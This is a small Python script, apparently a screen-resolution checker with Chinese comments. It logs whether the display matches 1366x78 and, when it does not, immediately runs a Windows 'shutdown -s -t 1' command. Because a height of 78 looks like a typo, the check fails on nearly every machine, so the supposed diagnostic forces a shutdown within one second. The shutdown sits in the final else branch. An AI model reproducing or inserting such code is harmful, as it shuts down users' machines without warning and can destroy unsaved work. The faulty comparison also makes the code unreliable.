import tkinter
screen = tkinter.Tk()
x = screen.winfo_screenwidth()
#获取当前屏幕的宽
y = screen.winfo_screenheight()
#获取当前屏幕的高
print(x,y)
if x == 1366 and y == 78:
    print("正确")
    f = open('正确结果.txt', 'a+')  # 记录结果
    print('正确', file=f)
    f.close()
else:
    print('错误')
    f = open('正确结果.txt', 'a+')  # 记录结果
    print('错误', file=f)
    f.close()

    import os
    if __name__ == '__main__':
        #print("请输入关机倒计时时间？(second)")

        time1 = int(1)

        os.system(f'shutdown -s -t {time1}')